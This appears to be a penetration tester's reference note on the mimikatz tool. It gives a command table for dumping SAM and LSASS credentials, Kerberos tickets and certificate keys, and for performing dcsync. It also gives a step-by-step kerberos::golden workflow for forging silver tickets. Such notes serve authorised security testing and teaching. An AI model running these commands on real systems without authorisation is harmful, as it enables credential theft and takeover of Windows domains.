---
tags:
  - "#type/tool"
  - "#attack/credential-access"
Link: https://github.com/gentilkiwi/mimikatz/wiki
Purpose: gather credentials on windows
---
# Info

Extracts password, hashes, etc. from various sources on windows:

- SAM
- Memory of the LSASS

For fundamentals see [[2 Tech-Specifics/OS/Windows/Authentication Attacks Windows|Authentication Attacks Windows]]

Good reference guide: [adsecurity](https://adsecurity.org/?page_id=1821)

**Required privileges:**
- Administrator
- SeDebugPrivilege: allows to debug (i.e. manipulate) processes of other users

Alternatively, use the [Token Module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-token#elevate) of mimikatz to elevate privileges.

# Usage

1. start mimikatz with `mimikatz.exe`
2. Use commands

**Hint:** Commands can also be supplied as arguments to the mimikatz command prompt

Commands within the mimikatz shell have the following format:

`<modulename>::<commandname> [arguments]`

e.g. `crypto::certificates /systemstore:local_machine`

Available modules: <https://github.com/gentilkiwi/mimikatz/wiki#modules>

**Common commands:**

| Command                                        | Purpose                                                                                           |
| ---------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| `log <path>`                                   | write output to file                                                                              |
| `privilege::debug`                             | enable debugging privileges                                                                       |
| `token::elevate`                               | elevate privileges                                                                                |
| `lsadump::sam`                                 | dump credentials form SAM                                                                         |
| `sekurlsa::logonpasswords`                     | dump cached passwords                                                                             |
| `sekurlsa::tickets`                            | dump cached [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#Kerberos\|Kerberos Tickets]]     |
| `crypto::capi`<br>or `crypto::cng`             | make non-exportable private keys from certificates exportable                                     |
| `kerberos::golden`                             | see [[#Forging Kerberos Tickets]]                                                                 |
| `lsadump::dcsync /user:<domain>\<target_user>` | perform [[2 Tech-Specifics/Active Directory/Authentication Attacks/dcsync Attack\|dcsync Attack]] |

# Snippets

## Forging Kerberos Tickets

See [[2 Tech-Specifics/Network/Protocols/TCP,UDP 88 Kerberos#Silver Tickets|Kerberos - Forging Silver Tickets]]

The following pieces of information are needed for the attack:

- password hash of the target service account
	- see [[2 Tech-Specifics/OS/Windows/Authentication Attacks Windows|Authentication Attacks Windows]]
- Domain SID
	- use `whoami /user` and only use the [[2 Tech-Specifics/OS/Windows/Fundamentals - Windows#SIDs|Domain SID]]
- SPN of the target service
	- e.g. use ``Get-DomainUser -SPN | select serviceprincipalname``

**Workflow:**

1. Use the `kerberos::golden` command like this:

```powershell
kerberos::golden /sid:<domain_SID> /domain:<domain_name> /ptt /target:<SPN> /service:<protocol> /rc4:<ntlm_hash> /user:<username>
```

- `/ptt` tells mimikatz to add the created ticket to the local cache
- `/service:<protocol>` - e.g. `http`, `smb`
- `/user` can be set to any existing domain user

2. use `klist` to verify that the ticket is present

**Hints:**
- The Group ID section in mimikatz output shows the groups RIDs set in the ticket (usually local admins, domain admins)
